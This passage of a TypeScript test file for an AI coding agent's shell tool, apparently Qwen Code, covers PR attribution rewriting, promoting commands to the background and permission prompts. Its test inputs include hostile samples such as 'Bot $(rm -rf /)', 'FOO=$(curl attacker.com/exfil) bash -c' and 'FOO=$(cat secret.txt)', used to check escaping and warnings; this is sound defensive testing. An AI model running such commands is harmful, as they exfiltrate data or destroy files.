        );
      });

      // Same `$(...)` bailout as addCoAuthorToGitCommit: a heredoc
      // body must not have the trailer spliced in mid-substitution.
      it('should NOT rewrite --body that contains $(...) command substitution', async () => {
        const command =
          'gh pr create --title "x" --body "$(cat <<\'EOF\'\nSummary\nEOF\n)"';
        const observed = await runPr(command);
        expect(observed).toBe(command);
        expect(observed).not.toContain(ATTRIBUTION);
      });

      // Without segment scoping the body regex would match curl's same-shaped
      // `-b "..."` cookie flag and inject attribution there, breaking curl.
      it('should NOT match -b in earlier non-gh segments of a compound', async () => {
        const observed = await runPr(
          'curl -b "session=abc" https://example.com && gh pr create --title "x" --body "summary"',
        );
        // curl's cookie is preserved; the trailer lands in gh's --body.
        expect(observed).toContain('curl -b "session=abc"');
        expect(observed).toMatch(
          /gh pr create --title "x" --body "summary[\s\S]*Generated with Qwen Code"/,
        );
      });

      // A `-b 'flag'` mention inside the outer `--body "..."` must not be taken
      // as the body: the trailer would land mid-body, corrupting the approved
      // command. Mirrors addCoAuthorToGitCommit's nested-match check.
      it('should pick the OUTER --body when an inner -b appears in body text', async () => {
        await runPr(
          'gh pr create --title "x" --body "docs mention -b \'flag\' here"',
        );
        const cmd = lastSpawnedCommand();
        // After the outer body's closing `"`, not between `flag` and `here`.
        expect(cmd).toMatch(
          /--body "docs mention -b 'flag' here[\s\S]*Generated with Qwen Code"/,
        );
        expect(cmd).not.toMatch(
          /-b 'flag[\s\S]*Generated with Qwen Code[\s\S]*' here"/,
        );
      });

      // gh uses the *last* `--body`; splicing into the first silently drops
      // attribution. Mirrors addCoAuthorToGitCommit's last-match behaviour.
      it('should target the LAST --body when gh pr create has multiple', async () => {
        await runPr(
          'gh pr create --title "x" --body "ignored" --body "real summary"',
        );
        const cmd = lastSpawnedCommand();
        expect(cmd).toMatch(
          /--body "ignored" --body "real summary[\s\S]*Generated with Qwen Code/,
        );
        expect(cmd).not.toMatch(
          /--body "ignored[\s\S]*Generated with Qwen Code[\s\S]*" --body/,
        );
      });

      it('should skip PR attribution when pr is off even if commit is on', async () => {
        // Commit and PR toggles must be independent.
        (mockConfig.getGitCoAuthor as Mock).mockReturnValue({
          commit: true,
          pr: false,
          name: 'Qwen-Coder',
          email: 'qwen-coder@alibabacloud.com',
        });

        await runPr('gh pr create --title "x" --body "Summary"');

        expectSpawned(expect.not.stringContaining(ATTRIBUTION));
      });

      // An unescaped `"`, `$` or backtick in the generator name would break
      // the approved `gh pr create` or run as command substitution; the fix
      // shell-escapes the appended text for the surrounding quote style.
      it('should escape generator names with shell metacharacters in double-quoted body', async () => {
        setCoAuthor('Bot $(rm -rf /) "danger" `eval`');
        // The generator name only reaches the attribution when shots > 0.
        CommitAttributionService.getInstance().incrementPromptCount();

        const observedCmd = await runPr(
          'gh pr create --title "x" --body "Summary"',
        );
        // Each metacharacter is escaped, and the `--body` quote still closes
        // (`s` flag: the attribution adds newlines).
        expectText(observedCmd, ['\\$', '\\"', '\\`']);
        expect(observedCmd).toMatch(/--body\s+".+"/s);
      });

      it('should escape single-quoted body containing apostrophes in generator name', async () => {
        setCoAuthor("O'Brien-Bot");
        CommitAttributionService.getInstance().incrementPromptCount();

        const observedCmd = await runPr(
          "gh pr create --title 'x' --body 'Summary'",
        );
        // The bash close-escape-reopen trick yields `'\''` in place of `'`.
        expect(observedCmd).toContain("O'\\''Brien-Bot");
      });

      // A body already in bash's `'\''` form is one argument: the attribution
      // appends after the full body, not after the first quote segment.
      it("should match the full body across '\\\\'' apostrophe escapes", async () => {
        const observed = await runPr(
          "gh pr create --title 'x' --body 'don'\\''t break me'",
        );
        expect(observed).toContain("don'\\''t break me");
        expect(observed).toMatch(
          /don'\\''t break me[\s\S]*Generated with Qwen Code/,
        );
      });
    });

    describe('foreground → background promote (#3831 PR-2)', () => {
      it("exposes a promote AbortController whose signal is wired into ShellExecutionService.execute's combined signal", async () => {
        // Aborting the controller from `setPromoteAbortControllerCallback`
        // must reach the service: instanceof alone passes if shell.ts omits
        // `promoteAbortController.signal` from `AbortSignal.any(...)`, silently
        // breaking the Ctrl+B keybind.
        const { promise, setPromoteAc } = executeWithPromote(
          build('npm run dev'),
        );
        resolveShellExecution({ pid: 12345 });
        await promise;

        expect(setPromoteAc).toHaveBeenCalledTimes(1);
        const passedAc = setPromoteAc.mock.calls[0][0] as AbortController;
        expect(passedAc).toBeInstanceOf(AbortController);

        // The signal handed to the service (4th arg) follows the controller.
        const passedSignal = mockShellExecutionService.mock
          .calls[0][3] as AbortSignal;
        expect(passedSignal.aborted).toBe(false);
        passedAc.abort({ kind: 'background', shellId: 'bg_unit_test' });
        expect(passedSignal.aborted).toBe(true);
      });

      it('registers a bg_xxx entry on `result.promoted: true` and returns promote-flavored ToolResult', async () => {
        const promise = build('tail -f /tmp/never.log').execute(
          mockAbortSignal,
        );
        // Service signals promote: snapshot ready, child still alive.
        resolveShellExecution({
          output: 'partial output before promote',
          exitCode: null,
          signal: null,
          aborted: false, // ← per #3831 design question 7
          promoted: true,
          pid: 99999,
        });
        const result = await promise;

        // Entry registered with the spawn pid + promote AbortController.
        expect(registry.register).toHaveBeenCalledTimes(1);
        const entry = registeredEntry();
        expect(entry.command).toBe('tail -f /tmp/never.log');
        expect(entry.cwd).toBe('/test/dir');
        expect(entry.status).toBe('running');
        expect(entry.pid).toBe(99999);
        expect(entry.shellId).toMatch(/^bg_/);
        expect(entry.outputPath).toContain(entry.shellId);
        expect(entry.abortController).toBeInstanceOf(AbortController);

        // PR-2.5: snapshot + post-promote bytes share one stream (formerly a
        // writeFileSync snapshot-only path).
        expect(fs.createWriteStream).toHaveBeenCalledWith(entry.outputPath, {
          flags: 'w',
        });
        const streamMock = (fs.createWriteStream as Mock).mock.results[0]
          ?.value as { write: Mock };
        expect(streamMock.write).toHaveBeenCalledWith(
          'partial output before promote',
        );

        // Model copy points at /tasks / dialog / task_stop and (#7626) teaches
        // executeBackground's status-file liveness heuristic, unbuffering hint
        // included, so the copies cannot drift.
        expectText(result.llmContent, [
          `promoted to background as ${entry.shellId}`,
          `PID: 99999`,
          '/tasks',
          `task_stop({ task_id: '${entry.shellId}'`,
          `status file: ${entry.outputPath.replace(/\.output$/, '.status')}`,
          'Do NOT infer liveness from the output file',
          'python -u',
          'stdbuf -oL',
        ]);
        expect(shellResultText(result.returnDisplay)).toContain(
          `Promoted to background: ${entry.shellId}`,
        );
        // No `error`: promote is success-shaped (#3831 design question 7 /
        // @tanzhenxin's PR-1 review).
        expect(result.error).toBeUndefined();
      });

      it('aborting entry.abortController kills the child via SIGTERM/SIGKILL and marks the registry entry cancelled', async () => {
        // `task_stop bg_xxx` (`registry.requestCancel` →
        // `entry.abortController.abort()`) must kill the child and mark the
        // entry 'cancelled'; the fresh-controller check doesn't cover killing.
        fakeTimers();
        const processKillSpy = spyKill();
        await runPromoted('tail -f /tmp/never.log', 55555);

        const entry = registeredEntry();
        entry.abortController.abort();
        // cancelChild sends SIGTERM in a microtask, then SIGKILL + cancel after
        // PROMOTE_CANCEL_SIGKILL_TIMEOUT_MS (200ms).
        await Promise.resolve();
        expect(processKillSpy).toHaveBeenCalledWith(-55555, 'SIGTERM');
        await vi.advanceTimersByTimeAsync(250);
        expect(processKillSpy).toHaveBeenCalledWith(-55555, 'SIGKILL');
        // 'cancelled' right after SIGKILL, so /tasks reflects user intent
        // without waiting for the (non-existent) settle path.
        expect(registry.cancel).toHaveBeenCalledWith(
          entry.shellId,
          expect.any(Number),
        );
      });

      it("entry.abortController is a FRESH controller (not the already-aborted promote controller) so task_stop's abort() actually fires kill listeners", async () => {
        // Real-bug regression: reusing the `promoteAbortController` that
        // triggered the promote registers it already aborted, so task_stop's
        // `abort()` is a no-op; with the service's listener detached by the
        // handoff, the child would survive task_stop forever.
        await runPromoted('tail -f /tmp/never.log', 77777);

        expect(registeredEntry().abortController.signal.aborted).toBe(false);
      });

      it('survives a snapshot write failure — registry entry still registered', async () => {
        vi.mocked(fs.writeFileSync).mockImplementation(() => {
          throw new Error('ENOSPC: no space left on device');
        });
        const result = await runPromoted(
          'tail -f /tmp/never.log',
          88888,
          'pre-promote',
        );

        // The write failure is logged + swallowed: the entry is useful on its
        // own; the file is the inspection surface, not the source of truth.
        expect(registry.register).toHaveBeenCalledTimes(1);
        expect(result.llmContent).toContain('promoted to background');
      });

      it('entry.command holds the post-co-author-rewrite form (commandToExecute), not raw params.command', async () => {
        // #3894 review: `entry.command` used `this.params.command`, diverging
        // from what ran once addCoAuthorToGitCommit() rewrote a `git commit -m`;
        // /tasks must show what the OS actually executed.
        const rawCommand = 'git commit -m "feat: ship promote"';
        const result = await runPromoted(rawCommand, 33333);

        const commandPassedToService = mockShellExecutionService.mock
          .calls[0][0] as string;
        expect(commandPassedToService).not.toBe(rawCommand); // sanity: rewrite happened
        expect(commandPassedToService).toContain('Co-authored-by');

        const entry = registeredEntry();
        expect(entry.command).toBe(commandPassedToService);
        expect(entry.command).not.toBe(rawCommand);
        // llmContent references the same form, so the model sees consistent state.
        expect(result.llmContent).toContain(commandPassedToService);
      });

      it('rethrows + kills child when mkdirSync(outputDir) throws — no orphan zombie', async () => {
        // @tanzhenxin's review on #3894: mkdirSync ran before any try/catch, so
        // an unwritable output dir (read-only mount, sandbox perms, ENOSPC on
        // metadata) rejected before the kill listener was wired, orphaning the
        // child until session end. Now: re-raised AND SIGTERM right away.
        const processKillSpy = spyKill();
        vi.mocked(fs.mkdirSync).mockImplementation(() => {
          throw new Error('EROFS: read-only file system');
        });

        await expect(
          runPromoted('tail -f /tmp/never.log', 22222),
        ).rejects.toThrow('EROFS');
        // SIGTERM is sync after the throw — no fake timers needed.
        expect(processKillSpy).toHaveBeenCalledWith(-22222, 'SIGTERM');
      });

      it('promote-refused race (aborted: true, promoted: false after promote signal) is reported as benign race, not "Command timed out"', async () => {
        // @tanzhenxin's review on #3894: Ctrl+B (PR-3) can fire the promote
        // abort just after the child ended; the race guard refuses, giving
        // `aborted: true, promoted: false`. Unless the promote signal is left
        // out of the timeout discriminator, that reads "Command timed out".
        const { promise, setPromoteAc } = executeWithPromote(build('sleep 1'));
        await Promise.resolve();
        const promoteAc = setPromoteAc.mock.calls[0]?.[0] as
          | AbortController
          | undefined;
        expect(promoteAc).toBeInstanceOf(AbortController);
        promoteAc!.abort({ kind: 'background', shellId: 'bg_late' });
        resolveShellExecution({
          output: 'oops too late\n',
          exitCode: null,
          aborted: true,
          promoted: false,
          pid: 33333,
        });
        const result = await promise;

        // Not "timed out": the benign race is explained so the agent doesn't
        // retry it as a cancellation/timeout, and the output is preserved.
        expectText(
          String(result.llmContent),
          ['Command finished before the background-promote', 'oops too late'],
          ['timed out'],
        );
        expect(result.returnDisplay).toMatchObject({ outcome: 'completed' });
      });

      it('rethrows + kills child when registry.register throws — no orphan zombie', async () => {
        // #3894 review: register is internally safe today (Map.set + emit),
        // but a throwing implementation would orphan the already-detached
        // child. The throw is re-raised AND the child gets SIGTERM via the
        // entry's abort listener.
        fakeTimers();
        const processKillSpy = spyKill();
        registry.register.mockImplementation(() => {
          throw new Error('boom: registry borked');
        });

        // Re-thrown to the caller (the scheduler surfaces it as a tool error).
        await expect(
          runPromoted('tail -f /tmp/never.log', 44444),
        ).rejects.toThrow('boom: registry borked');

        // The catch path fired entryAc.abort() → cancelChild → SIGTERM, then
        // SIGKILL after the 200ms timer.
        await Promise.resolve();
        expect(processKillSpy).toHaveBeenCalledWith(-44444, 'SIGTERM');
        await vi.advanceTimersByTimeAsync(250);
        expect(processKillSpy).toHaveBeenCalledWith(-44444, 'SIGKILL');
      });
    });

    describe('foreground → background promote PR-2.5 (post-promote stream + natural-exit settle)', () => {
      type SettleInfo = Parameters<Required<PostPromote>['onSettle']>[0];

      /** A settle event: exit `exitCode` (no signal by default) at `endTime`. */
      const settled = (
        endTime: number,
        exitCode: number | null = 0,
        signal: SettleInfo['signal'] = null,
      ): SettleInfo => ({ exitCode, signal, endTime });

      /** Makes the next spawn promote with the child already settled, before the promote resolves. */
      const mockSettledSpawn = (
        pid: number,
        output: string,
        endTime: number,
        exitCode = 0,
      ) =>
        mockPromotedSpawn(pid, output, (postPromote) =>
          postPromote?.onSettle?.(settled(endTime, exitCode)),
        );

      /** Asserts the registered entry completed (exit 0) at `endTime`. */
      const expectCompleted = (endTime: number) =>
        expect(registry.complete).toHaveBeenCalledWith(
          registeredEntry().shellId,
          0,
          endTime,
        );

      /** Asserts the model copy reports the child as already exited with `status`. */
      const expectExitedCopy = (result: ToolResult, status: string) =>
        expectText(
          result.llmContent,
          [`Status: ${status}.`, 'already exited'],
          ['Status: running.', 'task_stop({'],
        );

      /** Installs a stream whose 'error' listeners are captured and whose 'finish' never fires. */
      const installErroringStream = () => {
        const errorListeners: Array<(err: Error) => void> = [];
        installWriteStream({
          on: vi.fn((event: string, handler: (err: Error) => void) => {
            if (event === 'error') errorListeners.push(handler);
          }),
          once: vi.fn(),
        });
        return errorListeners;
      };
      const diskFull = () =>
        Object.assign(new Error('disk full'), { code: 'ENOSPC' });

      it('post-promote bytes APPEND to bg_xxx.output via write stream (do NOT overwrite snapshot)', async () => {
        // PR-2.5 stream redirect: the snapshot lands first, post-promote chunks
        // follow through `stream.write` in FIFO order. Before, the file froze
        // at promote time and live updates never reached /tasks.
        const writeStreamMock = installWriteStream();
        await runPromoted('tail -f /tmp/never.log', 11111, 'initial-snapshot');

        // Opened in overwrite mode, so a stale file under the same shellId
        // (vanishingly unlikely given randomBytes) starts fresh.
        expect(fs.createWriteStream).toHaveBeenCalledWith(
          registeredEntry().outputPath,
          { flags: 'w' },
        );
        expect(writeStreamMock.write).toHaveBeenNthCalledWith(
          1,
          'initial-snapshot',
        );
      });

      it('clean PTY exit transitions the registry entry to "completed" (exitCode 0, signal 0)', async () => {
        // PR-2.5 settle path: an exit (0, node-pty's clean signal 0) runs
        // `registry.complete(shellId, 0, ...)` and closes the stream. The mocked
        // service never fires onSettle, so the test drives it.
        const writeStreamMock = installWriteStream();
        await runPromoted('sleep 1', 22222);

        // Foreground execute always passes postPromote (post-PR-2.5).
        const opts = mockShellExecutionService.mock.calls[0][6] as {
          postPromote?: PostPromote;
        };
        expect(opts?.postPromote?.onSettle).toBeDefined();
        opts.postPromote!.onSettle!(settled(1700000000000, 0, 0));

        expectCompleted(1700000000000);
        expect(writeStreamMock.end).toHaveBeenCalled();
      });

      it('non-zero exit / signal / error all transition entry to "failed" with descriptive message', async () => {
        // The failure-mode decision table.
        await runPromoted('cmd', 33333);
        const onSettle = spawnedOnSettle();
        const { shellId } = registeredEntry();
        const expectFailed = (message: string, endTime: number) =>
          expect(registry.fail).toHaveBeenCalledWith(shellId, message, endTime);

        onSettle({ exitCode: 137, signal: null, endTime: 1 });
        expectFailed('Exited with code 137', 1);

        // Signal-killed (no exitCode).
        onSettle({ exitCode: null, signal: 15, endTime: 2 });
        expectFailed('Terminated by signal 15', 2);

        // node-pty can preserve exitCode 0 alongside a non-zero signal.
        onSettle({ exitCode: 0, signal: 15, endTime: 2.5 });
        expectFailed('Terminated by signal 15', 2.5);

        // Spawn-side error → fail with err.message.
        onSettle({
          exitCode: null,
          signal: null,
          error: new Error('ENOENT'),
          endTime: 3,
        });
        expectFailed('ENOENT', 3);
      });

      it('treats a child-process signal string as a failed settle', async () => {
        await runPromoted('cmd', 33334);
        spawnedOnSettle()({ exitCode: null, signal: 'SIGTERM', endTime: 3.5 });

        expect(registry.fail).toHaveBeenCalledWith(
          registeredEntry().shellId,
          'Terminated by signal SIGTERM',
          3.5,
        );
      });

      it('keeps a task_stop cancellation from being reclassified as a signal failure', async () => {
        fakeTimers();
        const processKillSpy = spyKill();
        await runPromoted('sleep 1', 12345);
        const onSettle = spawnedOnSettle();
        const entry = registeredEntry();

        // `task_stop` aborts the fresh registry controller before the child
        // reports its SIGTERM/SIGKILL settle event.
        entry.abortController.abort();
        await Promise.resolve();
        expect(processKillSpy).toHaveBeenCalledWith(-12345, 'SIGTERM');
        await vi.advanceTimersByTimeAsync(250);
        expect(processKillSpy).toHaveBeenCalledWith(-12345, 'SIGKILL');
        onSettle({ exitCode: 0, signal: 15, endTime: 4 });

        expect(registry.cancel).toHaveBeenCalledWith(entry.shellId, 4);
        expect(registry.fail).not.toHaveBeenCalled();
      });

      it('queued-settle race: onSettle fires BEFORE handlePromotedForeground completes — entry settles + llmContent reflects final status', async () => {
        // A fast command can exit between the service's promote-resolve and
        // handlePromotedForeground's register + onSettleWired install. PR-2.5
        // queues it in `promoteArtifacts.settleQueued` and drains after wiring;
        // without that the entry stays 'running' (onSettle fires only once).
        installWriteStream();
        mockSettledSpawn(77777, 'final output', 1700000000123);

        const result = await build('echo hi').execute(mockAbortSignal);

        expectCompleted(1700000000123);
        // The copy says 'completed' and does NOT suggest task_stop (the
        // process is already gone).
        expectExitedCopy(result, 'completed');
      });

      it('queued-settle race with non-zero exit code: llmContent reflects failed status', async () => {
        installWriteStream();
        mockSettledSpawn(88888, 'error output', 1700000000456, 1);

        const result = await build('exit 1').execute(mockAbortSignal);

        expect(registry.fail).toHaveBeenCalledWith(
          registeredEntry().shellId,
          'Exited with code 1',
          1700000000456,
        );
        expectExitedCopy(result, 'failed');
      });

      it("wave-2 (C3): llmContent reflects 'completed' even when stream.once('finish') fires asynchronously after the queued-settle drain", async () => {
        // Regression (C3): the status flag flipped only in `transitionRegistry`,
        // which `onSettleWired` defers to 'finish'; on the queued-settle path
        // `llmContent` said "Status: running" + `task_stop` for a gone child.
        // The fix: `postPromoteSettleObserved` (sync, on classify) drives the
        // copy, `transitionRegistry` (behind finish) the registry. The finish
        // handler is captured, not fired, to keep the transition deferred.
        let capturedFinishHandler: (() => void) | null = null;
        installWriteStream({
          once: vi.fn((event: string, handler: () => void) => {
            if (event === 'finish') capturedFinishHandler = handler;
          }),
        });
        mockSettledSpawn(88888, 'fast output', 1700000000999);

        const result = await build('true').execute(mockAbortSignal);

        // 'finish' captured but not invoked: the transition is still deferred…
        expect(capturedFinishHandler).not.toBeNull();
        expect(registry.complete).not.toHaveBeenCalled();
        // …yet the copy reports the terminal status.
        expectExitedCopy(result, 'completed');

        // Fire 'finish' now: the registry transition runs post-flush.
        capturedFinishHandler!();
        expectCompleted(1700000000999);
      });

      it('wave-2 (C1): stream open async error transitions registry — does not hang waiting on `finish`', async () => {
        // Regression (C1): open failures (ENOENT / EACCES / ENOSPC) arrive as an
        // async 'error', not a throw. The listener only logged, `stream` kept
        // the broken stream, and `onSettleWired` waited on a 'finish' that
        // never fires (stuck `running`). The latch nulls `stream`, so the
        // `if (!stream)` branch transitions without 'finish' (captured, unfired).
        const errorListeners = installErroringStream();
        await runPromoted('sleep 1', 99999);

        // ENOSPC after the stream is assigned: the latch nulls the slot.
        expect(errorListeners.length).toBeGreaterThan(0);
        errorListeners[0](diskFull());

        // onSettle sees `stream === null` and transitions without waiting.
        spawnedOnSettle()(settled(1700000111111));

        expectCompleted(1700000111111);
      });

      it('stream open async error writes diagnostic marker via appendFileSync', async () => {
        const errorListeners = installErroringStream();
        await runPromoted('sleep 1', 99998);

        errorListeners[0](diskFull());

        expect(fs.appendFileSync).toHaveBeenCalledWith(
          expect.stringContaining('bg_'),
          expect.stringContaining('[WARNING: post-promote output lost'),
        );
      });

      it('flush timeout transitions registry when stream.finish never fires', async () => {
        fakeTimers();
        installWriteStream({ once: vi.fn() });
        await runPromoted('sleep 1', 99997);

        spawnedOnSettle()(settled(1700000222222));

        // 'finish' never fired: no transition yet…
        expect(registry.complete).not.toHaveBeenCalled();

        // …until the 10s flush timeout passes.
        vi.advanceTimersByTime(10_001);
        expectCompleted(1700000222222);
      });

      it('wave-3 (T2): onSettleWired drains pre-settle buffer AND latches streamClosed so post-end chunks drop instead of leaking the buffer', async () => {
        // Regression: `onSettleWired` nulled `promoteArtifacts.stream` BEFORE
        // `stream.end()`, so a chunk before 'finish' (`stream === null &&
        // !streamClosed`) went into a buffer with no drain path left: stranded
        // unobserved. Now the buffer drains before nulling and `streamClosed`
        // latches, so later chunks DROP (onData's third branch).
        const writeStreamMock = installWriteStream({ once: vi.fn() });
        const postPromote = mockPromotedSpawn(55555, 'snapshot');
        const onData = (chunk: string) =>
          postPromote()?.onData?.({ type: 'data', chunk });

        const promise = build('sleep 1').execute(mockAbortSignal);
        // The service mock has run by now. A chunk arriving before
        // handlePromotedForeground opens the stream is buffered, then drained.
        await new Promise((resolve) => setImmediate(resolve));
        onData('pre1');
        await promise;
        expect(writeStreamMock.write).toHaveBeenCalledWith('pre1');

        // Between handlePromotedForeground and settle: straight to the stream.
        onData('mid1');
        expect(writeStreamMock.write).toHaveBeenCalledWith('mid1');

        // Settle drains any remaining buffer, nulls stream, latches streamClosed.
        postPromote()?.onSettle?.(settled(1700001111111));

        // POST-SETTLE chunks (kernel buffer race) must DROP, not accumulate
        // in the buffer (the pre-wave-3 leak).
        onData('post1');
        onData('post2');
        const writeCalls = writeStreamMock.write.mock.calls.map(
          (c: unknown[]) => c[0],
        );
        expect(writeCalls).not.toContain('post1');
        expect(writeCalls).not.toContain('post2');
      });

      it('wave-3 (T3): catch-path clears the buffered chunks and falls back to writeFileSync(snapshot)', async () => {
        // Regression for the silent drop: if createWriteStream throws (e.g.
        // ENOENT on a vanished tmpdir), buffered chunks can't be salvaged; the
        // buffer is emptied (no stale chunks later) and the count logged for
        // oncall (not asserted: debugLogger has no session in tests). Checks:
        // the writeFileSync snapshot fallback, no crash, a later settle.
        vi.mocked(fs.createWriteStream).mockImplementationOnce(() => {
          throw Object.assign(new Error('ENOENT no tmpdir'), {
            code: 'ENOENT',
          });
        });
        // Passthrough, since the default mock would be a no-op.
        const writeFileSyncSpy = vi
          .mocked(fs.writeFileSync)
          .mockImplementationOnce(() => undefined);

        // 3 pre-finalizer chunks, all queued in the buffer.
        const postPromote = mockPromotedSpawn(44444, 'snap', (pp) => {
          pp?.onData?.({ type: 'data', chunk: 'a' });
          pp?.onData?.({ type: 'data', chunk: 'b' });
          pp?.onData?.({ type: 'data', chunk: 'c' });
        });

        await build('whatever').execute(mockAbortSignal);

        expect(writeFileSyncSpy).toHaveBeenCalledWith(
          expect.any(String),
          'snap',
        );

        // The catch path set streamClosed: a settle still transitions and a
        // late chunk is dropped without crashing.
        postPromote()?.onSettle?.(settled(1700002222222));
        postPromote()?.onData?.({ type: 'data', chunk: 'post-settle' });

        expectCompleted(1700002222222);
      });

      it('wave-4 (T4): post-promote `onData` chunks have ANSI stripped before write (matches executeBackground file format)', async () => {
        // Regression: executeBackground strips ANSI before writing but the
        // promoted onData path wrote raw chunks, so after Ctrl+B the file
        // turned into `\x1b[31m` / cursor-move / clear-screen noise past the
        // snapshot, unreadable for an agent that `Read`s it.
        const writeStreamMock = installWriteStream();
        const postPromote = mockPromotedSpawn(33333, 'pre-promote snapshot');

        await build('npm test').execute(mockAbortSignal);

        // Common escapes: color, cursor move, clear-screen.
        const ansiChunk =
          '\x1b[31mFAILED\x1b[0m: 3 tests\n\x1b[2K\x1b[1Aprogress: 50%';
        postPromote()?.onData?.({ type: 'data', chunk: ansiChunk });

        // The stream received the visible text without escape sequences.
        const writeCalls = writeStreamMock.write.mock.calls.map(
          (c: unknown[]) => c[0] as string,
        );
        const post = writeCalls.find(
          (c) => typeof c === 'string' && c.includes('FAILED'),
        );
        expect(post).toBeDefined();
        expect(post).not.toContain('\x1b[');
        expect(post).toBe('FAILED: 3 tests\nprogress: 50%');
      });
    });
  });

  describe('getDefaultPermission and getConfirmationDetails', () => {
    const detailsOf = async (
      invocation: ToolInvocation<ShellToolParams, ToolResult>,
    ) =>
      (await invocation.getConfirmationDetails(
        new AbortController().signal,
      )) as {
        type: string;
        rootCommand: string;
        permissionRules: string[];
        warnings?: string[];
      };

    it.each([undefined, '/test/dir/subdir', '/test/dir/subdir/..'])(
      'should allow read-only commands within the workspace in %s',
      async (directory) => {
        const invocation = build('ls -la', { directory });
        expect(await invocation.getDefaultPermission()).toBe('allow');
        expect(await detailsOf(invocation)).not.toHaveProperty('warnings');
      },
    );

    it.each([
      '/not/in/workspace',
      '/tmp/project-other',
      '/tmp/project/../project-other',
    ])(
      'should ask and warn for a read-only command outside the workspace in %s',
      async (directory) => {
        const resolver = vi
          .spyOn(workspaceContextUtils, 'resolveWorkspacePath')
          .mockImplementation((value) => path.resolve(value));
        try {
          const workspaceContext = createMockWorkspaceContext('/test/dir', [
            '/tmp/project',
          ]);
          (mockConfig.getWorkspaceContext as Mock).mockReturnValue(
            workspaceContext,
          );
          const invocation = build('ls', { directory });

          expect(await invocation.getDefaultPermission()).toBe('ask');
          const details = await detailsOf(invocation);
          expect(details.type).toBe('exec');
          expect(details.warnings).toEqual([
            `Runs outside the workspace in ${directory}`,
          ]);
          expect(workspaceContext.isPathWithinWorkspace).toHaveBeenCalledWith(
            directory,
          );
        } finally {
          resolver.mockRestore();
        }
      },
    );

    it.each([
      // PR #4386 round 6 (cid 3298521039), env-prefix wrapper substitution
      // bypass: `stripShellWrapper` ran BEFORE the AST check, dropping the env
      // assignment and unwrapping `bash -c`, so `FOO=$(curl evil) bash -c
      // 'echo ok'` read as `echo ok` → 'allow' → silent auto-execute (the R4
      // top-level guard only sees what survives the strip). The fix checks the
      // ORIGINAL command; 'ask' shows the dialog with its warning.
      [
        'asks (not allow) for env-prefix substitution inside a bash wrapper',
        `FOO=$(curl attacker.com/exfil) bash -c 'echo ok'`,
      ],
      [
        'asks for backtick env-prefix substitution inside a bash wrapper',
        `FOO=\`whoami\` bash -c 'ls -la'`,
      ],
    ])('%s', async (_title, command) => {
      expect(await build(command).getDefaultPermission()).toBe('ask');
    });

    it('asks for a read-only command only when its directory is outside the workspace', async () => {
      const local = build('ls -la', { directory: '/test/dir/subdir' });
      expect(await local.getDefaultPermission()).toBe('allow');
      const outside = build('ls -la', { directory: '/test/dir-other' });
      expect(await outside.getDefaultPermission()).toBe('ask');
      const details = await detailsOf(outside);
      expect(details.warnings ?? []).toContain(
        'Runs outside the workspace in /test/dir-other',
      );
    });

    it('should request confirmation for a non-read-only command and return details', async () => {
      const invocation = build('npm install');
      expect(await invocation.getDefaultPermission()).toBe('ask');
      expect((await detailsOf(invocation)).type).toBe('exec');
    });

    it('should exclude read-only sub-commands from confirmation details in compound commands', async () => {
      // "cd" is read-only, "npm run build" is not
      const invocation = build('cd packages/core && npm run build');
      expect(await invocation.getDefaultPermission()).toBe('ask');

      const details = await detailsOf(invocation);

      // Neither rootCommand nor permissionRules include cd.
      expect(details.rootCommand).not.toContain('cd');
      expect(details.rootCommand).toContain('npm');
      expect(details.permissionRules).not.toContainEqual(
        expect.stringContaining('cd'),
      );
      expect(details.permissionRules).toContainEqual(
        expect.stringContaining('npm'),
      );
    });

    it('should not surface file descriptor redirects as standalone commands in confirmation details', async () => {
      const invocation = build('npm run build 2>&1 | head -100');
      expect(await invocation.getDefaultPermission()).toBe('ask');

      const details = await detailsOf(invocation);

      expect(details.rootCommand).toBe('npm');
      expect(details.permissionRules).toEqual(['Bash(npm run *)']);
    });

    it('should exclude already-allowed sub-commands from confirmation details in compound commands', async () => {
      const pm = new PermissionManager({
        getPermissionsAllow: () => ['Bash(git add *)'],
        getPermissionsAsk: () => [],
        getPermissionsDeny: () => [],
        getProjectRoot: () => '/test/dir',
        getCwd: () => '/test/dir',
      });
      pm.initialize();
      (mockConfig.getPermissionManager as Mock).mockReturnValue(pm);

      const details = await detailsOf(
        build('git add /tmp/file && git commit -m "msg"'),
      );

      expect(details.rootCommand).toBe('git');
      expect(details.permissionRules).toEqual(['Bash(git commit *)']);
    });

    it('should pass the invocation directory to permission-manager command checks', async () => {
      const pm = {
        isCommandAllowed: vi.fn().mockResolvedValue('ask'),
      } as unknown as PermissionManager;
      (mockConfig.getPermissionManager as Mock).mockReturnValue(pm);

      await detailsOf(
        build('git commit -m "msg"', { directory: '/test/dir/subdir' }),
      );

      expect(pm.isCommandAllowed).toHaveBeenCalledWith(
        'git commit -m "msg"',
        '/test/dir/subdir',
      );
    });

    it('should throw an error if validation fails', async () => {
      expect(() => build('')).toThrow();
    });

    // Issue #4093: command substitution must be visibly flagged in the
    // confirmation prompt rather than silently denied (see
    // ShellToolInvocation.getConfirmationDetails).
    describe('command substitution warning (issue #4093)', () => {
      /** The warnings for `command`, asserting the first flags substitution. */
      const expectSubstitutionWarning = async (command: string) => {
        const { warnings } = await detailsOf(build(command));
        expect(warnings?.[0]).toMatch(/command substitution/i);
        return warnings;
      };

      it('surfaces a warning for $() command substitution', async () => {
        const warnings = await expectSubstitutionWarning(
          'python3 -c "print($(echo hello))"',
        );

        expect(warnings).toBeDefined();
        expect(warnings).toHaveLength(1);
      });

      it.each([
        [
          'surfaces a warning for backtick command substitution',
          'echo `whoami`',
        ],
        [
          'surfaces a warning for <() process substitution',
          'diff <(ls /a) <(ls /b)',
        ],
        [
          'surfaces a warning for >() output process substitution',
          'echo data > >(tee log.txt)',
        ],
      ])('%s', async (_title, command) => {
        await expectSubstitutionWarning(command);
      });

      it('does not set warnings on commands without substitution', async () => {
        const details = await detailsOf(build('npm install'));

        // `warnings` should be omitted entirely when there's nothing to flag.
        expect(details.warnings).toBeUndefined();
      });

      // PR #4386 R4 (cid 3293075622): `buildShellExecWarnings`'s
      // `|| detectCommandSubstitution(rawCommand)` branch only fires when the
      // stripped inner command (`echo ok`) is clean but the env-prefix is not;
      // without this case, removing the `||` clause regresses nothing.
      it('surfaces a warning for substitution in the env-prefix of a shell wrapper', async () => {
        const warnings = await expectSubstitutionWarning(
          `FOO=$(cat secret.txt) bash -c 'echo ok'`,
        );

        expect(warnings).toBeDefined();
      });
    });
  });

  describe('getDescription', () => {
    const originalEnv = { ...process.env };

    afterEach(() => {
      process.env = { ...originalEnv };
    });

    function buildForShape(
